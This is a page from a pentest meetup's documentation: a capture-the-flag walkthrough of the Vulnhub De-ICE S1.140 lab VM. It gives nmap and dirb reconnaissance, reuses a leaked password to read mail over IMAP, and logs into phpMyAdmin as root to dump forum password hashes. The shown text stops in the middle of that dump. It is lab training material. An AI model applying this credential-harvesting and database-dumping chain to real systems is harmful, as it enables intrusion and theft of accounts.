

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.3. De-ICE Level 6 &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="3.4. De-ICE Level 5" href="de-ice5.html" />
    <link rel="prev" title="3.2. OwlNest" href="owlnest.html" /> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.3. De-ICE Level 6</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.3.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vm">3.3.1.1. Setting up the VM</a></li>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-your-environment">3.3.1.2. Setting up your environment</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.3.2. Reconnaisance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#network-reconnaissance">3.3.2.1. Network reconnaissance</a></li>
<li class="toctree-l4"><a class="reference internal" href="#reconnaissance-on-port-21">3.3.2.2. Reconnaissance on port 21</a></li>
<li class="toctree-l4"><a class="reference internal" href="#reconnaissance-on-port-22">3.3.2.3. Reconnaissance on port 22</a></li>
<li class="toctree-l4"><a class="reference internal" href="#reconnaissance-on-ports-80-443">3.3.2.4. Reconnaissance on ports 80 &amp; 443</a></li>
<li class="toctree-l4"><a class="reference internal" href="#browsing-port-80">3.3.2.5. Browsing port 80</a></li>
<li class="toctree-l4"><a class="reference internal" href="#reconnaissance-on-port-993">3.3.2.6. Reconnaissance on port 993</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.3.3. The Exploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#phpmyadmin-as-root">3.3.3.1. phpMyAdmin as root</a></li>
<li class="toctree-l4"><a class="reference internal" href="#exploring-ftp-as-rhedley">3.3.3.2. Exploring FTP as rhedley</a></li>
<li class="toctree-l4"><a class="reference internal" href="#exploring-ssh-as-mbrown">3.3.3.3. Exploring SSH as mbrown</a></li>
<li class="toctree-l4"><a class="reference internal" href="#getting-etc-shadow">3.3.3.4. Getting <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code></a></li>
<li class="toctree-l4"><a class="reference internal" href="#capturing-the-flag">3.3.3.5. Capturing the flag</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.3. De-ICE Level 6</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/de-ice6.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="de-ice-level-6">
<span id="de-ice6"></span><h1>3.3. De-ICE Level 6<a class="headerlink" href="#de-ice-level-6" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.3.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/de-ice-s1140,57/">Vulnhub De-ICE: S1.140</a>, the sixth of the Vulnhub De-ICE series. The challenge is to get <code class="file docutils literal notranslate"><span class="pre">/root/flag.txt</span></code> (which doesn’t exist so <code class="file docutils literal notranslate"><span class="pre">/root/secret.jpg</span></code> is the next best thing).</p>
<p>This De-ICE challenge is another password cracking test of patience. While none of the steps are exceptionally difficult, the online password cracking lists are big enough to take potentially many hours to try; given it’s not a sure path, many might give up on that being the correct path. Most of the time they’d be correct, but in this case not. And there’s no way to finish this exercise in anything close to 1 hour even knowing the required steps - the online password cracking takes too long.</p>
<div class="section" id="setting-up-the-vm">
<h3>3.3.1.1. Setting up the VM<a class="headerlink" href="#setting-up-the-vm" title="Permalink to this headline">¶</a></h3>
<p>The VM comes packaged as the live ISO <a class="reference external" href="http://hackingdojo.com/downloads/iso/De-ICE_S1.140.iso">De-ICE_S1.140.iso</a> running Ubuntu 12.04.</p>
</div>
<div class="section" id="setting-up-your-environment">
<h3>3.3.1.2. Setting up your environment<a class="headerlink" href="#setting-up-your-environment" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice6
mkdir -p <span class="nv">$PT</span>
<span class="nb">cd</span> <span class="nv">$PT</span>
<span class="c1"># download de-ice6_setup.sh</span>
curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/de-ice6_setup.sh
<span class="c1"># edit as needed; later the recon will give you TARGET IPs</span>
<span class="nb">source</span> de-ice6_setup.sh
</pre></div>
</div>
<p>The source for <code class="file docutils literal notranslate"><span class="pre">de-ice6_setup.sh</span></code> (<a class="reference download internal" href="../_downloads/de-ice6_setup.sh" download=""><code class="xref download docutils literal notranslate"><span class="pre">de-ice6_setup.sh</span></code></a>) should look something like the following.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="c1"># *******************************************************</span>
<span class="c1"># Edit these to match your setup</span>
<span class="c1"># *******************************************************</span>
<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.104          <span class="c1"># ip of de-ice6</span>
<span class="nv">SUBNET</span><span class="o">=</span><span class="m">192</span>.168.1.0/24         <span class="c1"># subnet</span>
<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.28             <span class="c1"># Kali IP</span>
<span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice6      <span class="c1"># create working directories here</span>

<span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>grep -c de-ice6 /etc/hosts<span class="k">)</span> -eq <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nb">echo</span> <span class="s2">&quot; add \&quot;</span><span class="nv">$TARGET</span><span class="s2"> de-ice6.com\&quot; to /etc/hosts&quot;</span>
<span class="k">fi</span>

<span class="c1"># *******************************************************</span>
<span class="c1"># Maybe edit these</span>
<span class="c1"># *******************************************************</span>
<span class="c1"># Create some directories</span>
<span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,spider
<span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
<span class="nv">TARGETS</span><span class="o">=</span>targets.txt

<span class="c1"># *******************************************************</span>
<span class="c1"># Don&#39;t edit these</span>
<span class="c1"># *******************************************************</span>
<span class="nv">HOST</span><span class="o">=</span>de-ice6.com
<span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="reconnaisance">
<h2>3.3.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="network-reconnaissance">
<h3>3.3.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h3>
<p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice6
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice6_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap

<span class="nv">$SUDO</span> nmap -sn -PE -oA nmap_sn <span class="nv">$SUBNET</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_sn.*
<span class="c1"># use the grep-able output to get a list of target hosts</span>
grep Up nmap_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="c1"># use the xml output to get an html report</span>
xsltproc nmap_sn.xml -o nmap_sn.html
</pre></div>
</div>
<p>The result is we find the IP for de-ice6: $TARGET. Update $PT/de-ice6_setup.sh and also edit <code class="file docutils literal notranslate"><span class="pre">/etc/hosts</span></code> to add “de-ice6.com” (<code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">&quot;$TARGET</span> <span class="pre">de-ice6.com&quot;</span> <span class="pre">|</span> <span class="pre">$SUDO</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">/etc/hosts</span></code>).</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice6
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice6_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap

<span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA nmap_A <span class="nv">$TARGET</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_A.*
xsltproc nmap_A.xml -o nmap_A.html
</pre></div>
</div>
<p>Running the above reveals:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="go">PORT    STATE  SERVICE  REASON         VERSION</span>
</span><span class="hll"><span class="go">21/tcp  open   ftp      syn-ack ttl 64 ProFTPD 1.3.4a</span>
</span><span class="hll"><span class="go">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
</span><span class="go">|_Can&#39;t get directory listing: ERROR</span>
<span class="hll"><span class="go">22/tcp  open   ssh      syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</span>
</span><span class="hll"><span class="go">80/tcp  open   http     syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1)</span>
</span><span class="go">|_http-methods: GET HEAD POST OPTIONS</span>
<span class="go">|_http-server-header: Apache/2.2.22 (Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1</span>
<span class="go">|_http-title: Lazy Admin Corp.</span>
<span class="hll"><span class="go">443/tcp open   ssl/http syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1)</span>
</span><span class="go">| http-cisco-anyconnect:</span>
<span class="go">|_  ERROR: Not a Cisco ASA or unsupported version</span>
<span class="go">|_http-methods: GET HEAD POST OPTIONS</span>
<span class="go">|_http-server-header: Apache/2.2.22 (Ubuntu) mod_ssl/2.2.22 OpenSSL/1.0.1</span>
<span class="go">|_http-title: Lazy Admin Corp.</span>
<span class="go">465/tcp closed smtps    reset ttl 64</span>
<span class="hll"><span class="go">993/tcp open   ssl/imap syn-ack ttl 64 Dovecot imapd</span>
</span><span class="go">|_imap-capabilities: IDLE SASL-IR ID LOGIN-REFERRALS post-login ENABLE AUTH=PLAIN IMAP4rev1 listed capabilities AUTH=LOGINA0001 OK Pre-login have more LITERAL+</span>
<span class="hll"><span class="go">995/tcp open   ssl/pop3 syn-ack ttl 64 Dovecot pop3d</span>
</span></pre></div>
</div>
</div>
<div class="section" id="reconnaissance-on-port-21">
<h3>3.3.2.2. Reconnaissance on port 21<a class="headerlink" href="#reconnaissance-on-port-21" title="Permalink to this headline">¶</a></h3>
<p>FTP reconnaissance using the anonymous account showed an empty incoming directory.</p>
</div>
<div class="section" id="reconnaissance-on-port-22">
<h3>3.3.2.3. Reconnaissance on port 22<a class="headerlink" href="#reconnaissance-on-port-22" title="Permalink to this headline">¶</a></h3>
<p>SSH reconnaissance showed that publickey authentication is required (“Permission denied (publickey”).</p>
</div>
<div class="section" id="reconnaissance-on-ports-80-443">
<h3>3.3.2.4. Reconnaissance on ports 80 &amp; 443<a class="headerlink" href="#reconnaissance-on-ports-80-443" title="Permalink to this headline">¶</a></h3>
<p>We do some standard reconnaissance on HTTP(S) ports:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice6
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice6_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/spider

<span class="hll">dirb  http://<span class="nv">$HOST</span>/ -o dirb80_<span class="nv">$HOST</span>.txt
</span><span class="hll">dirb  https://<span class="nv">$HOST</span>/ -o dirb443_<span class="nv">$HOST</span>.txt
</span></pre></div>
</div>
<p>Running this results in these important findings:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">==&gt; DIRECTORY: http://de-ice6.com/forum/</span>
<span class="hll"><span class="go">==&gt; DIRECTORY: https://de-ice6.com/forum/</span>
</span><span class="hll"><span class="go">==&gt; DIRECTORY: https://de-ice6.com/phpmyadmin/</span>
</span><span class="hll"><span class="go">==&gt; DIRECTORY: https://de-ice6.com/webmail/</span>
</span></pre></div>
</div>
</div>
<div class="section" id="browsing-port-80">
<h3>3.3.2.5. Browsing port 80<a class="headerlink" href="#browsing-port-80" title="Permalink to this headline">¶</a></h3>
<p>Browsing the directories found by <strong class="program">dirb</strong> lead to forum page <a class="reference external" href="http://de-ice6.com/forum/index.php?id=8">http://de-ice6.com/forum/index.php?id=8</a> which revealed HTTP user id “mbrown” who entered their password in the user field revealing password “!DFiuoTkbxtdk0!”:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span>Mar 7 11:15:32 testbox sshd[5772]: Invalid user !DFiuoTkbxtdk0! from 10.0.0.23
Mar 7 11:15:32 testbox sshd[5772]: input_userauth_request: invalid user !DFiuoTkbxtdk0! [preauth]

Mar 7 11:15:32 testbox sshd[5774]: Connection from 10.0.0.23 port 35155
Mar 7 11:15:32 testbox sshd[5774]: Accepted keyboard-interactive/pam for mbrown from 10.0.0.23 port 35168 ssh2
</pre></div>
</div>
<p>Logging on the forum as mbrown (email <a class="reference external" href="mailto:mb&#37;&#52;&#48;lazyadmin&#46;corp">mb<span>&#64;</span>lazyadmin<span>&#46;</span>corp</a>) and visiting <a class="reference external" href="http://de-ice6.com/forum/index.php?mode=user">http://de-ice6.com/forum/index.php?mode=user</a> showed these addition forum users: admin, rhedley, and swillard.</p>
<p>Using the newly-found user id and password didn’t work on FTP (password probably different) and SSH didn’t allow passwords.</p>
</div>
<div class="section" id="reconnaissance-on-port-993">
<h3>3.3.2.6. Reconnaissance on port 993<a class="headerlink" href="#reconnaissance-on-port-993" title="Permalink to this headline">¶</a></h3>
<p>Next you can log into webmail via the browser (<a class="reference external" href="https://de-ice6.com/webmail/">https://de-ice6.com/webmail/</a>) for
“mbrown” using email id of “<a class="reference external" href="mailto:mb&#37;&#52;&#48;lazyadmin&#46;corp">mb<span>&#64;</span>lazyadmin<span>&#46;</span>corp</a>” with password “!DFiuoTkbxtdk0!”. Look in the INBOX’s May 13, 2013 email to find the root MySQL password, then at the SENT message dated Mar 10, 2013 for the root phpMyAdmin password: “S4!y.dk)j/_d1pKtX1” in both cases. Alternatively you can use <code class="docutils literal notranslate"><span class="pre">openssl</span> <span class="pre">s_client</span></code> from the command line:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/de-ice6
<span class="nb">source</span> <span class="nv">$PT</span>/de-ice6_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/spider

<span class="hll">openssl s_client -connect de-ice6.com:993 -crlf
</span><span class="hll">? LOGIN mb@lazyadmin.corp !DFiuoTkbxtdk0!
</span><span class="hll">? LIST <span class="s2">&quot;&quot;</span> <span class="s2">&quot;*&quot;</span>
</span><span class="hll">? SELECT INBOX
</span><span class="hll">? FETCH <span class="m">1</span> BODY<span class="o">[]</span>
</span><span class="hll">? FETCH <span class="m">2</span> BODY<span class="o">[]</span>
</span><span class="c1"># results in</span>
<span class="c1"># here are the login-informations for mysql:</span>
<span class="c1">#</span>
<span class="hll"><span class="c1"># Username: root</span>
</span><span class="hll"><span class="c1"># Password: S4!y.dk)j/_d1pKtX1</span>
</span>? SELECT INBOX.Sent
? FETCH <span class="m">1</span> BODY<span class="o">[]</span>
<span class="c1"># results in</span>
<span class="c1"># &gt; here are the login-informations for PHPMyAdmin:</span>
<span class="c1"># &gt;</span>
<span class="c1"># &gt; Username: root</span>
<span class="c1"># &gt; Password: S4!y.dk)j/_d1pKtX1</span>
</pre></div>
</div>
<p>So now we have the root password for mysql/PHPMyAdmin of “S4!y.dk)j/_d1pKtX1”.</p>
</div>
</div>
<div class="section" id="the-exploit">
<h2>3.3.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
<div class="section" id="phpmyadmin-as-root">
<h3>3.3.3.1. phpMyAdmin as root<a class="headerlink" href="#phpmyadmin-as-root" title="Permalink to this headline">¶</a></h3>
<p>Quickly logging into <a class="reference external" href="https://de-ice6.com/phpmyadmin/">https://de-ice6.com/phpmyadmin/</a> as “root” with password “S4!y.dk)j/_d1pKtX1”, we dump the databases and get the passwords from the <a class="reference external" href="http://mylittleforum.net/">my little forum</a> MySQL forum database table mlf2_userdata:</p>
<div class="highlight-mysql notranslate"><div class="highlight"><pre><span></span><span class="k">INSERT</span> <span class="k">INTO</span> <span class="ss">`mlf2_userdata`</span> <span class="p">(</span><span class="ss">`user_id`</span><span class="p">,</span> <span class="ss">`user_type`</span><span class="p">,</span> <span class="ss">`user_name`</span><span class="p">,</span> <span class="ss">`user_real_name`</span><span class="p">,</span> <span class="ss">`gender`</span><span class="p">,</span> <span class="ss">`birthday`</span><span class="p">,</span> <span class="ss">`user_pw`</span><span class="p">,</span> <span class="ss">`user_email`</span><span class="p">,</span> <span class="ss">`email_contact`</span><span class="p">,</span> <span class="ss">`user_hp`</span><span class="p">,</span> <span class="ss">`user_location`</span><span class="p">,</span> <span class="ss">`signature`</span><span class="p">,</span> <span class="ss">`profile`</span><span class="p">,</span> <span class="ss">`logins`</span><span class="p">,</span> <span class="ss">`last_login`</span><span class="p">,</span> <span class="ss">`last_logout`</span><span class="p">,</span> <span class="ss">`user_ip`</span><span class="p">,</span> <span class="ss">`registered`</span><span class="p">,</span> <span class="ss">`category_selection`</span><span class="p">,</span> <span class="ss">`thread_order`</span><span class="p">,</span> <span class="ss">`user_view`</span><span class="p">,</span> <span class="ss">`sidebar`</span><span class="p">,</span> <span class="ss">`fold_threads`</span><span class="p">,</span> <span class="ss">`thread_display`</span><span class="p">,</span> <span class="ss">`new_posting_notification`</span><span class="p">,</span> <span class="ss">`new_user_notification`</span><span class="p">,</span> <span class="ss">`user_lock`</span><span class="p">,</span> <span class="ss">`auto_login_code`</span><span class="p">,</span> <span class="ss">`pwf_code`</span><span class="p">,</span> <span class="ss">`activate_code`</span><span class="p">,</span> <span class="ss">`language`</span><span class="p">,</span> <span class="ss">`time_zone`</span><span class="p">,</span> <span class="ss">`time_difference`</span><span class="p">,</span> <span class="ss">`theme`</span><span class="p">,</span> <span class="ss">`entries_read`</span><span class="p">)</span> <span class="k">VALUES</span>
<span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;0000-00-00&#39;</span><span class="p">,</span> <span class="s1">&#39;fd339d53bf599d4ec7281ace84a902dc2ca16c7f63cbb16261&#39;</span><span class="p">,</span> <span class="s1">&#39;webmaster@lazyadmin.corp&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="s1">&#39;2013-03-24 18:03:02&#39;</span><span class="p">,</span> <span class="s1">&#39;2013-03-24 18:08:31&#39;</span><span class="p">,</span> <span class="s1">&#39;192.168.8.1&#39;</span><span class="p">,</span> <span class="s1">&#39;2013-03-09 14:57:17&#39;</span><span class="p">,</span> <span class="no">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;6,10,11,12,13,14,8,9,7,15,1,2,3,4,5&#39;</span><span class="p">),</span>
<span class="hll"><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;RHedley&#39;</span><span class="p">,</span> <span class="s1">&#39;Richard Hedley&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;0000-00-00&#39;</span><span class="p">,</span> <span class="s1">&#39;31cbbdab9f5e1ebfa7d81267c258e29b5f9e171e6fcf7b1ba3&#39;</span><span class="p">,</span> <span class="s1">&#39;rh@lazyadmin.corp&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="s1">&#39;2013-03-24 18:09:38&#39;</span><span class="p">,</span> <span class="s1">&#39;2013-03-24 18:09:52&#39;</span><span class="p">,</span> <span class="s1">&#39;192.168.8.1&#39;</span><span class="p">,</span> <span class="s1">&#39;2013-03-09 15:22:22&#39;</span><span class="p">,</span> <span class="no">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;6,10,11,12,13,14,8,9,7,15,1,2,3,4,5&#39;</span><span class="p">),</span>
